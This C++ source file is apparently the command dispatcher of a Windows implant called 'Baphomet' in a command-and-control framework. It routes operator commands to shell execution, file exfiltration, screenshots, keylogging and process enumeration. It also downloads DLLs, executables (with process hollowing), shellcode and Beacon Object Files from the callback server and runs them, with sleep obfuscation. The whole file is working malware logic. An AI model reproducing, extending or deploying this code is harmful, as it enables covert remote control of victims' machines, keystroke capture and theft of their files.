//
// Created by diago on 2024-06-06.
//

#include <dispatch.hpp>



std::string
dispatch::format_output(const std::string& str) {

    auto output = std::string("\"\n") + (str + '\"');
    for(size_t i = 0; i < output.size(); i++) {
        if(output[i] < 0 || output[i] > 127) {
            output[i] = '?';
        }
    }

    return output;
}

command_output
dispatch::process_command(
        _In_ const std::string& command_str,
        _In_ const char delimeter,
        _In_ const implant_context& ctx
    ) {

    size_t start            = 0;
    size_t next_delimeter   = command_str.find(delimeter);
    std::vector<std::string> args;

    while(next_delimeter != std::string::npos) {
        if(next_delimeter > start) {
            args.push_back(command_str.substr(start, next_delimeter - start));
        }

        start = next_delimeter + 1;
        next_delimeter = command_str.find(delimeter, start);
    }

    if(args.empty()) {
        return { format_output("Invalid command."), nullptr, output_type::PLAIN_TEXT };
    }


#ifdef BAPHOMET_DEBUG
    printf("[+] Command chunks:\n");
    for(size_t i = 0; i < args.size(); i++) {
        printf(" - %s\n", args[i].c_str());
    }
#endif


    static const dispatch_pair commands[] = {
        {"pwd",         &dispatch::pwd},
        {"cd",          &dispatch::cd},
        {"ls",          &dispatch::ls},
        {"cat",         &dispatch::cat},
        {"whoami",      &dispatch::whoami},
        {"rm",          &dispatch::rm},
        {"mkdir",       &dispatch::mkdir},
        {"cp",          &dispatch::cp},
        {"ps",          &dispatch::ps},
        {"cmd",         &dispatch::cmd},
        {"getinfo",     &dispatch::getinfo},
        {"procenum",    &dispatch::procenum},
        {"exfil",       &dispatch::exfil},
        {"screenshot",  &dispatch::screenshot},
        {"rundll",      &dispatch::rundll},
        {"runexe",      &dispatch::runexe},
        {"runshellcode",&dispatch::runshellcode},
        {"runbof",      &dispatch::runbof},
        {"keylog",      &dispatch::keylog}
    };

    for(size_t i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
        if(args[0] == commands[i].name) {
            return commands[i].func(args, ctx);
        }
    }

    return { format_output("That command does not exist."), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::pwd(const std::vector<std::string> &args, const implant_context &ctx) {
    return { format_output(tasking::pwd()), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::cd(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 2) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }

    return { format_output(tasking::cd(args[1])), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::ls(const std::vector<std::string> &args, const implant_context &ctx) {
    return { format_output(tasking::ls()), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::cat(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 2) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }

    return { format_output(tasking::cat(args[1])), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::whoami(const std::vector<std::string> &args, const implant_context &ctx) {
    return { format_output(recon::whoami()), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::rm(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 2) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }

    return { format_output(tasking::rm(args[1])), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::mkdir(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 2) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }

    return { format_output(tasking::mkdir(args[1])), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::cp(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 3) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }

    return { format_output(tasking::cp(args[1], args[2])), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::ps(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 2) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }

    return { format_output(tasking::shell_command(args[1], true)), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::cmd(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 2) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }

    return { format_output(tasking::shell_command(args[1], false)), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::getinfo(const std::vector<std::string> &args, const implant_context &ctx) {
    return { format_output(recon::generate_basic_info()), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::procenum(const std::vector<std::string> &args, const implant_context &ctx) {
    std::string procs = recon::enumerate_processes();

    if(procs.size() > 15000) {
        HANDLE hprocs = tasking::write_into_file(procs, "pr.txt", procs.size(), true);
        if(hprocs == nullptr) {
            return {format_output("Failed to create output file for process report."), nullptr, output_type::PLAIN_TEXT};
        }
        return {"", hprocs, output_type::FILE};
    }

    return { procs, nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::exfil(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 2) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }


    HANDLE hfile = tasking::get_file_handle(args[1]);
    if(hfile == nullptr) {
        return { format_output(io::win32_failure("upload", "CreateFileA")), nullptr, output_type::PLAIN_TEXT };
    }

    return {"", hfile, output_type::FILE };
}


command_output
dispatch::screenshot(const std::vector<std::string> &args, const implant_context &ctx) {
    HANDLE hscreenshot = recon::save_screenshot();
    if(hscreenshot == nullptr) {
        return {"Failed to save screenshot.", nullptr, output_type::PLAIN_TEXT };
    }

    return {"", hscreenshot, output_type::FILE};
}


command_output
dispatch::rundll(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 2) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }


    obfus::sleep(ctx);
    std::string dll_file;

    if(!networking::http::recieve_file(
        ctx.hconnect,
        ctx.callback_object,
        args[1],
        ctx.session_token,
        ctx.is_https,
        dll_file
    )) {
        return {
            format_output("Failed to download specified DLL: " + args[1]),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }

    return {
        format_output(tasking::rundll(dll_file)),
        nullptr,
        output_type::PLAIN_TEXT
    };
}


command_output
dispatch::runexe(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 3) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }


    obfus::sleep(ctx);
    std::string exe_file;

    if(!networking::http::recieve_file(
        ctx.hconnect,
        ctx.callback_object,
        args[1],
        ctx.session_token,
        ctx.is_https,
        exe_file
    )) {
        return {
            format_output("Failed to download specified executable: " + args[1]),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }

    return {
        format_output(tasking::runexe(args[2] == "hollow", exe_file)),
        nullptr,
        output_type::PLAIN_TEXT
    };
}


command_output
dispatch::runshellcode(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 3) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }


    obfus::sleep(ctx);
    std::string shellcode_buff;

    if(!networking::http::recieve_file(
        ctx.hconnect,
        ctx.callback_object,
        args[1],
        ctx.session_token,
        ctx.is_https,
        shellcode_buff
    )) {
        return {
            format_output("Failed to download shellcode: " + args[1]),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }

    uint32_t pid        = 0;
    bool     child      = false;

    if(args[2] == "child") {
        child = true;
    } else if(args[2] == "local") {
        pid = GetCurrentProcessId();
    } else {
        pid = static_cast<uint32_t>(atoi(args[2].c_str()));
    }

    return {
        format_output(tasking::run_shellcode(pid, child, true, shellcode_buff)),
        nullptr,
        output_type::PLAIN_TEXT
    };
}


command_output
dispatch::runbof(const std::vector<std::string> &args, const implant_context &ctx) {
    if(args.size() < 3) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }


    obfus::sleep(ctx);
    std::string bof_buff;

    if(!networking::http::recieve_file(
        ctx.hconnect,
        ctx.callback_object,
        args[1],
        ctx.session_token,
        ctx.is_https,
        bof_buff
    )) {
        return {
            format_output("Failed to download Beacon Object File: " + args[1]),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }

    return { format_output(tasking::execute_bof(bof_buff, args.size() < 3 ? nullptr : args[2].c_str())), nullptr, output_type::PLAIN_TEXT };
}


command_output
dispatch::keylog(const std::vector<std::string>& args, const implant_context& ctx) {
    if(args.size() < 2) {
        return { format_output("Invalid argument length"), nullptr, output_type::PLAIN_TEXT};
    }


    if(ctx.use_sleepmask) {
        return { format_output("This command is not supported with sleepmask enabled."), nullptr, output_type::PLAIN_TEXT };
    }

    std::string buffer;

    if(args[1] == "start") {
        recon::keylog(recon::keylog_action::START, buffer);
        return { format_output(buffer), nullptr, output_type::PLAIN_TEXT };
    }
    if(args[1] == "stop") {
        recon::keylog(recon::keylog_action::STOP, buffer);
        return { format_output(buffer), nullptr, output_type::PLAIN_TEXT };
    }
    if(args[1] == "get") {
        if(!recon::keylog(recon::keylog_action::GET, buffer)) {
            return { format_output(buffer), nullptr, output_type::PLAIN_TEXT };
        }

        HANDLE hfile = tasking::write_into_file(buffer, "bpmlog.txt", buffer.size(), true);
        if(hfile == nullptr) {
            return { format_output("Failed to upload log file."), nullptr, output_type::PLAIN_TEXT };
        }

        return {"", hfile, output_type::FILE};
    }

    return { format_output("Invalid action."), nullptr, output_type::PLAIN_TEXT };
}

